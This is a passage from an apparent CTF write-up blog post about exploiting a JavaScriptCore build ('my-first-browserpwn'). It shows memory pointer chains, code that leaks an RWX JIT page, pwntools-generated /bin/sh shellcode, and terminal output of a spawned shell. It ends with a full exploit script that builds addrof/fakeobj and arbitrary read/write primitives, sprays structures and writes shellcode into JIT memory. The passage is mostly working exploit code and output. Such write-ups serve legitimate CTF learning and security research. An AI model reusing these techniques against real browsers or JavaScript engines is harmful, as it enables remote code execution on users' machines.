+<span style="color:#ae81ff">0x7fffb34e5f00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff38b1000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555557a718</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x18</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555556c4c0</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>cave<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>fe<span style="color:#f92672">-</span>ctf<span style="color:#f92672">/</span>finals<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>jsc
+<span style="color:#ae81ff">0x7fffb34e5f00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff38b1000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555557a718</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x555555573100</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>cave<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>fe<span style="color:#f92672">-</span>ctf<span style="color:#f92672">/</span>finals<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>jsc
+<span style="color:#ae81ff">0x7fffb34e5f00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff38b1000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555557a718</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555556ce10</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>cave<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>fe<span style="color:#f92672">-</span>ctf<span style="color:#f92672">/</span>finals<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>jsc
+<span style="color:#ae81ff">0x7fffb34e5f00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff38b1000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555557a718</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555556cb10</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>cave<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>fe<span style="color:#f92672">-</span>ctf<span style="color:#f92672">/</span>finals<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>jsc
+<span style="color:#ae81ff">0x7fffb34e5f00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff38b1000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x55555557a718</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x38</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x555555571bc0</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>cave<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>fe<span style="color:#f92672">-</span>ctf<span style="color:#f92672">/</span>finals<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>first<span style="color:#f92672">-</span>browserpwn<span style="color:#f92672">/</span>jsc
+
+<span style="color:#f92672">...</span>
+</code></pre></div><p>Now we note these offsets, and we can leak the RWX:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// // # +0x18, +0x8, +0x10,
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">addrFunc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b_addrof</span>(<span style="color:#a6e22e">func</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;Now I am going to read from: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">addrFunc</span>))
+<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">readmem</span>(<span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">addrFunc</span>)))
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;And I read: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">read_val</span>))
+
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;Now I am going to read from: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>))
+<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">readmem</span>(<span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>)))
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;And I read: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">read_val</span>))
+
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;Now I am going to read from: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>))
+<span style="color:#a6e22e">rwx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">readmem</span>(<span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>)))
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;[***] leaked RWX: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rwx</span>))
+</code></pre></div><p>and we just use pwntools to generate some quick and dirty shellcode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> asm(pwnlib<span style="color:#f92672">.</span>shellcraft<span style="color:#f92672">.</span>amd64<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>sh())
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;jhH</span><span style="color:#ae81ff">\xb8</span><span style="color:#e6db74">/bin///sPH</span><span style="color:#ae81ff">\x89\xe7</span><span style="color:#e6db74">hri</span><span style="color:#ae81ff">\x01\x01\x81</span><span style="color:#e6db74">4$</span><span style="color:#ae81ff">\x01\x01\x01\x01</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xf6</span><span style="color:#e6db74">Vj</span><span style="color:#ae81ff">\x08</span><span style="color:#e6db74">^H</span><span style="color:#ae81ff">\x01\xe6</span><span style="color:#e6db74">VH</span><span style="color:#ae81ff">\x89\xe6</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xd2</span><span style="color:#e6db74">j;X</span><span style="color:#ae81ff">\x0f\x05</span><span style="color:#e6db74">&#39;</span>
+</code></pre></div><p>Now because of this whole thing with how JavaScript handles integers, we need to add 0x10000, to what we&rsquo;re writing. Now my exploit doesn&rsquo;t work every time, and I suspect it&rsquo;s because of some garbage collection, or maybe the offsets from the leakfind sometimes differ, anyhow:</p>
+<pre tabindex="0"><code>cave@townie:~/CTF/fe-ctf/finals/my-first-browserpwn/my-first-browserpwn$ ./jsc poc.js
+Now I am going to read from: 0x7fe624df1698
+And I read: 0x7fe624de5f00
+Now I am going to read from: 0x7fe624de5f08
+And I read: 0x7fe665116000
+Now I am going to read from: 0x7fe665116020
+[***] leaked RWX: 0x7fe625100b5c
+Segmentation fault (core dumped)
+cave@townie:~/CTF/fe-ctf/finals/my-first-browserpwn/my-first-browserpwn$ ./jsc poc.js
+Now I am going to read from: 0x7ff28c4f1698
+And I read: 0x7ff28c4e5f00
+Now I am going to read from: 0x7ff28c4e5f08
+And I read: 0x7ff2cc82d000
+Now I am going to read from: 0x7ff2cc82d020
+[***] leaked RWX: 0x7ff2cc7f95bc
+GG Chall Done
+$ w
+ 00:30:45 up  4:43,  8 users,  load average: 2.16, 2.46, 2.53
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+cave     :0       :0               19:47   ?xdm?   3:25m  0.00s /usr/libexec/gdm-x-session --register-session --run-script /usr/bin/rego
+cave     pts/1    tmux(14141).%0   20:01    4:29m  0.24s  0.12s vim token
+cave     pts/4    tmux(14141).%1   20:01    4:26m  0.11s  0.11s -bash
+</code></pre><h2 id="exploit">Exploit</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">BASE</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x100000000</span>;
+
+<span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>)
+<span style="color:#a6e22e">u32</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#a6e22e">buf</span>)
+<span style="color:#a6e22e">f64</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">buf</span>)
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ord</span>(<span style="color:#a6e22e">str</span>){
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">0</span>);
+}
+
+<span style="color:#a6e22e">read64</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">where</span>) {
+    <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">where</span>
+    <span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x10</span>
+    <span style="color:#a6e22e">hax</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>]
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">victim</span>.<span style="color:#a6e22e">a</span>
+}
+
+<span style="color:#a6e22e">write64</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">where</span>, <span style="color:#a6e22e">what</span>) {
+    <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">where</span>
+    <span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x10</span>
+    <span style="color:#a6e22e">hax</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>]
+    <span style="color:#a6e22e">victim</span>.<span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">what</span>
+}
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">i</span>) {
+    <span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">%</span><span style="color:#a6e22e">BASE</span>;
+    <span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">/</span><span style="color:#a6e22e">BASE</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>];
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">f</span>) {
+    <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#a6e22e">BASE</span><span style="color:#f92672">*</span><span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">1</span>];
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unbox_double</span>(<span style="color:#a6e22e">d</span>) {
+    <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">d</span>;
+    <span style="color:#a6e22e">u8</span>[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>];
+}
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">x</span>) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">x</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">`-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">hex</span>(<span style="color:#f92672">-</span><span style="color:#a6e22e">x</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">`0x</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">b_addrof</span>(<span style="color:#a6e22e">x</span>) {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">x</span>))
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">b_fakeobj</span>(<span style="color:#a6e22e">x</span>) {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">x</span>))
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">b_readmem</span>(<span style="color:#a6e22e">x</span>) {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">readmem</span>(<span style="color:#a6e22e">x</span>))
+}
+
+<span style="color:#75715e">// Above is mainly helper functions
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">structure_spray</span> <span style="color:#f92672">=</span> []
+<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">1000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">array</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">13.37</span>];
+    <span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">13.37</span>;
+    <span style="color:#a6e22e">array</span>[<span style="color:#e6db74">&#39;p&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">13.37</span>;
+    <span style="color:#a6e22e">structure_spray</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">array</span>)
+}
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">victim</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">structure_spray</span>[<span style="color:#ae81ff">512</span>];
+
+<span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x200</span>;
+
+<span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x01082007</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10000</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flags_arr_double</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>];
+
+<span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x01082009</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10000</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flags_arr_contiguous</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>];
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">outer</span> <span style="color:#f92672">=</span> {
+    <span style="color:#a6e22e">cell_header</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">flags_arr_contiguous</span>,
+    <span style="color:#a6e22e">butterfly</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">victim</span>,
+};
+
+<span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">outer</span>)
+<span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x10</span>
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>]);
+<span style="color:#75715e">//
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">unboxed</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>,<span style="color:#ae81ff">13.37</span>]
+<span style="color:#a6e22e">unboxed</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4.2</span> <span style="color:#75715e">// convert `CopyOnWriteArrayWithDoubles` to `ArrayWithDoubles`
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">boxed</span> <span style="color:#f92672">=</span> [{}];
+<span style="color:#75715e">//
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">hax</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">unboxed</span> <span style="color:#75715e">// (1)
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tmp_butterfly</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">victim</span>[<span style="color:#ae81ff">1</span>]; <span style="color:#75715e">// (2)
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">hax</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">boxed</span> <span style="color:#75715e">// (3)
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">victim</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span>  <span style="color:#a6e22e">tmp_butterfly</span>; <span style="color:#75715e">// (4)
+</span><span style="color:#75715e">//
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">outer</span>.<span style="color:#a6e22e">cell_header</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">flags_arr_double</span>
+
+<span style="color:#75715e">// Stage 2
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">makeJITCompiledFunction</span>() {
+    <span style="color:#75715e">// Some code to avoid inlining...
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">target</span>(<span style="color:#a6e22e">num</span>) {
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">num</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">num</span> <span style="color:#f92672">%</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) {
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+            }
+        }
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+    }
+
+    <span style="color:#75715e">// Force JIT compilation.
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">target</span>(<span style="color:#a6e22e">i</span>);
+    }
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">target</span>(<span style="color:#a6e22e">i</span>);
+    }
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">target</span>(<span style="color:#a6e22e">i</span>);
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">target</span>;
+}
+<span style="color:#75715e">//
+</span><span style="color:#75715e">// /*
+</span><span style="color:#75715e">// 0x7fffb34f1660+0x18 —▸ 0x7fffb34e5e80+0x8 —▸ 0x7ffff382b000+0x20 —▸ 0x7fffb38001dc [anon_7fffb37ff]
+</span><span style="color:#75715e">// */
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">func</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">makeJITCompiledFunction</span>()
+<span style="color:#75715e">// # +0x18, +0x8, +0x10,
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">addrFunc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b_addrof</span>(<span style="color:#a6e22e">func</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;Now I am going to read from: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">addrFunc</span>))
+<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">readmem</span>(<span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">addrFunc</span>)))
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;And I read: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">read_val</span>))
+
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;Now I am going to read from: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>))
+<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">readmem</span>(<span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>)))
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;And I read: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">read_val</span>))
+
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;Now I am going to read from: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>))
+<span style="color:#a6e22e">rwx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">readmem</span>(<span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">read_val</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>)))
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;[***] leaked RWX: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rwx</span>))
+
+<span style="color:#a6e22e">shell_code</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05\xcc&#34;</span>
+
+<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span>(<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+    <span style="color:#a6e22e">write64</span>(<span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">rwx</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span>), <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">ord</span>(<span style="color:#a6e22e">shell_code</span>[<span style="color:#a6e22e">i</span>])<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10000</span>))
+}
+
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;GG Chall Done&#34;</span>)
+<span style="color:#a6e22e">func</span>()
+</code></pre></div><h2 id="primary-ressources">Primary ressources</h2>
+<p>[1] <a href="http://phrack.org/issues/70/3.html">http://phrack.org/issues/70/3.html</a>
+[2] <a href="https://liveoverflow.com/setup-and-debug-javascriptcore-webkit-browser-0x01/">https://liveoverflow.com/setup-and-debug-javascriptcore-webkit-browser-0x01/</a></p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
